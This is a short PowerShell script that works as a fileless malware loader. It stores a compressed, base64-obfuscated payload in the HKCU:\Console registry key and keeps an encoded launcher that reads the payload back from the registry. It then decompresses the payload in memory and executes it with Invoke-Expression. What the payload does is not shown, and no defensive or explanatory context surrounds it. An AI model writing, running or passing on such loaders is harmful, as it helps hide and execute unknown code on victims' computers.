$code = "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"
Set-ItemProperty "HKCU:\Console\" -Name ContentScript -Value $code;

$base64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKABnAHAAIAAnAEgASwBDAFUAOgBcAEMAbwBuAHMAbwBsAGUAJwApAC4AQwBvAG4AdABlAG4AdABTAGMAcgBpAHAAdAApACkAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA=="
Set-ItemProperty "HKCU:\Console\" -Name EScript -Value $code;

$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String($code));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
